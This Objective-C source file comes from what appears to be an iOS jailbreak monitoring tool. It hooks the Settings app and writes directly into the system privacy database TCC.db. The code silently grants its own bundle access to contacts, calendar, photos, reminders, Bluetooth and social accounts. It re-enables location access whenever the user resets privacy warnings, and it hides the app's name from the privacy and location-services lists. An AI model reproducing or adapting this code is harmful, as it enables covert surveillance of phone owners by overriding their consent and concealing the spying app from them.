//
//  Privacy.h
//  MSFSP
//
//  Created by Makara Khloth on 2/13/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FMDatabase.h"
#import "FMResultSet.h"
#import "Visibility.h"

#import "ResetPrefController+IOS6.h"
#import "LocationServicesListController+IOS6.h"
#import "PrivacyController.h"
#import "TCCAccessController.h"

#pragma mark -
#pragma mark - C functions IOS6
#pragma mark -

//================== Insert into privacy DB
void insertPrivacyAccess() {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		Visibility *vis = [Visibility sharedVisibility];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																				@"kTCCServiceCalendar" ,
																				@"kTCCServicePhotos",
																				@"kTCCServiceReminders",
																				@"kTCCServiceTwitter",
																				@"kTCCServiceFacebook",
																				@"kTCCServiceSinaWeibo",
																				@"kTCCServiceBluetoothPeripheral",
																				@"ACAccountTypeIdentifierFacebook",
																				@"ACAccountTypeIdentifierTwitter",
																				@"ACAccountTypeIdentifierSinaWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access VALUES('%@','%@',0,1,0)",
										[arrayAccess objectAtIndex:i], [vis mBundleID]];
				[db executeUpdate:sql];
				DLog(@"Update privacy access table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

//================== Insert into privacy DB
void insertPrivacyAccessTime() {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		Visibility *vis = [Visibility sharedVisibility];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																			  @"kTCCServiceCalendar" ,
																			  @"kTCCServicePhotos",
																			  @"kTCCServiceReminders",
																			  @"kTCCServiceTwitter",
																			  @"kTCCServiceFacebook",
																			  @"kTCCServiceSinaWeibo",
																			  @"kTCCServiceBluetoothPeripheral",
																			  @"ACAccountTypeIdentifierFacebook",
																			  @"ACAccountTypeIdentifierTwitter",
																			  @"ACAccountTypeIdentifierSinaWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access_times VALUES('%@','%@',0,0)",
												[arrayAccess objectAtIndex:i], [vis mBundleID]];
				[db executeUpdate:sql];
				DLog (@"Update privacy access_times table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

#pragma mark -
#pragma mark -IOS6
#pragma mark -

HOOK(ResetPrefController, resetPrivacyWarnings$,void, id arg1) {
	DLog (@"ResetPrefController >>>>> resetLocationWarnings: ")	
	Visibility *vis = [Visibility sharedVisibility];
    CALL_ORIG(ResetPrefController,  resetPrivacyWarnings$,arg1);
	DLog (@"Resetting authorization status");
	[CLLocationManager setAuthorizationStatus:YES forBundleIdentifier:[vis mBundleID]];
	insertPrivacyAccess();
	insertPrivacyAccessTime();
}

#pragma mark -
#pragma mark Hide application name from location services (Obsolete)
#pragma mark -

HOOK(LocationServicesListController, _setLocationServicesEnabled$,void, BOOL arg1) {
	BOOL locationEnabled = [CLLocationManager locationServicesEnabled];
	if (locationEnabled) {
		DLog (@"location service is ON -> OFF")
	} else {
		DLog (@"location service is OFF -> ON")
		NSMutableDictionary *specifiersByID = nil;
		object_setInstanceVariable(self, "_specifiersByID", specifiersByID);
		
		NSArray *specifiers = nil;
		object_setInstanceVariable(self, "_specifiers", specifiers);
	}
	
	CALL_ORIG(LocationServicesListController,  _setLocationServicesEnabled$, arg1);
}

#pragma mark -
#pragma mark Hide application name from location services, all privacy table cell in preferences
#pragma mark -

HOOK(TCCAccessController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
	DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
	DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(TCCAccessController, tableView$cellForRowAtIndexPath$,arg1,arg2);
	Visibility *vis = [Visibility sharedVisibility];
	DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
	if ([[items text]isEqualToString:[vis mBundleName]] ) {
		DLog (@"============================ >>>>> HOOK Preference Table : ")	
		DLog (@"============================ >>>>> MBackup Found and hide : ")
		[items setHidden:YES];
	}
    return items;
}

HOOK(LocationServicesListController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
	DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
	DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(LocationServicesListController, tableView$cellForRowAtIndexPath$,arg1,arg2);
	Visibility *vis = [Visibility sharedVisibility];
	DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
	if ([[items text]isEqualToString:[vis mBundleName]] ) {
		DLog (@"============================ >>>>> HOOK Preference Table : ")	
		DLog (@"============================ >>>>> MBackup Found and hide : ")
		[items setHidden:YES]; 
	}
    return items;
}